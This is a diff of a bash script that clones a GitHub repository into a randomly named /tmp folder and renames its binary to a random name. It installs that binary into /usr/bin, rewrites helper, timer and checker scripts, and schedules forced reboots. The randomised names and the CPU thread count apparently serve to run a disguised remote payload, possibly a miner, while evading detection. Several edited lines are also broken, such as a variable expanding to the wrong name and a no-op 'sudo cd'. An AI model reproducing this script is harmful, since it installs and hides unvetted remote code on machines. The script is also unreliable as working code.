@@ -1,5 +1,8 @@
 #!/bin/bash
 
+sudo apt-get update -y;
+sudo apt-get install at -y;
+
 ID="$(hostname)"
 
 THREADS="$(nproc --all)"
@@ -7,9 +10,9 @@ THREADS="$(nproc --all)"
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 echo 'sudo reboot -f' | at now + 12 hours
 
+
 apt-get -y install gpw
 apt-get -y install sudo
-
 
 
 timer=$(gpw 1 11)
@@ -36,17 +39,17 @@ sudo git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
 sudo cd /tmp/$tmpfoldername
 sudo mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
 sudo chmod +x /tmp/$tmpfoldername/$softwarename
-sudo chmod 777 ./*.sh
+sudo chmod 777 *.sh
 sudo cp /tmp/$tmpfoldername/$softwarename /usr/bin/
 
 ##########################################################
 
-sudo sed -i "s/defaultsoftwarename/$softwarename/g" 1.sh
-sudo sed -i "s/defaultsoftwarename/$softwarename/g" 2.sh
-sudo sed -i "s/defaultsoftwarename/$softwarename/g" 3.sh
-sudo sed -i "s/defaultsoftwarename/$softwarename/g" 4.sh
-sudo sed -i "s/defaultsoftwarename/$softwarename/g" 5.sh
-sudo sed -i "s/defaultsoftwarename/$softwarename/g" 6.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/$softwarename1.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/$softwarename2.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/$softwarename3.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/$softwarename4.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/$softwarename5.sh
+sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/$softwarename6.sh
 
 sudo mv 1.sh $1x.sh
 sudo mv 2.sh $2x.sh
@@ -74,7 +77,7 @@ sudo mv /tmp/$tmpfoldername/defaulttimer.sh /tmp/$tmpfoldername/$timer.sh
 sudo sed -i "s/\<tmpfoldername\>/$tmpfoldername/g" /tmp/$tmpfoldername/defaultchecker.sh
 sudo sed -i "s/\<defaulttimer.sh\>/$timer.sh/g" /tmp/$tmpfoldername/defaultchecker.sh
 
-sudo mv /tmp/$tmpfoldername/defaultchecker.sh /tmp/$tmpfoldername/$checker
+sudo mv /tmp/$tmpfoldername/defaultchecker.sh /tmp/$tmpfoldername/$checker.sh
 
 ##########################################################
 
